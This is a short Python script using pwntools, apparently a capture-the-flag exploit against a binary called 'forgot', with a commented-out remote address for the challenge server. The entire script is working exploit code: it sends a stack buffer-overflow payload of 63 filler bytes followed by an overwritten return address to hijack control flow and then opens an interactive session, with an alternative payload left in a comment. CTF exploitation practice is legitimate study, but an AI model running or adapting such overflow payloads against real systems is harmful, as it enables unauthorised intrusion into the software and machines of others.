from pwn import *
context.log_level ='debug'
sh=process('./forgot')
#sh=remote('111.198.29.45','32440')
sh.recvuntil('> ')
pay ="A"*63+"\xcc\x86\x04\x08"
sh.sendline(pay)
sh.recv()
#pay = '1'*0x20+p64(0x8048600)+p64(0x8048618)+p64(0x804862c)+p64(0x8048640)+p64(0x8048654)+p64(0x8048668)+p64(0x804867c)+p64(0x8048690)+p64(0x80486a4)+p64(0x80486b8)+'a'*0x34 + p32(0x80486cc)
pay = "A"*63+"\xcc\x86\x04\x08"
sh.sendline(pay)
#gdb.attach(sh)
sh.interactive()
